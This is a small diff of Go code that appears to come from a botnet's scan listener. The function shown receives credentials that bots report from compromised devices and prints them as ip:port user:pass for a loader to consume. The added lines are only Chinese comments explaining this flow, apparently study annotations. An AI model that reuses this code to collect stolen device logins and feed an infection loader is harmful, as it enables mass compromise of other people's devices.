@@ -76,6 +76,9 @@ func handleConnection(conn net.Conn) {
         return
     }
 
+    //格式化输出　　ip:port user:pass
+
+    //scanListen和loader跑在一个机器上，所以接收到bot上传的数据后，直接printf就可以了，loader的主线程一直在读取stdin
     fmt.Printf("%d.%d.%d.%d:%d %s:%s\n", (ipInt >> 24) & 0xff, (ipInt >> 16) & 0xff, (ipInt >> 8) & 0xff, ipInt & 0xff, portInt, string(usernameBuf), string(passwordBuf))
 }
 
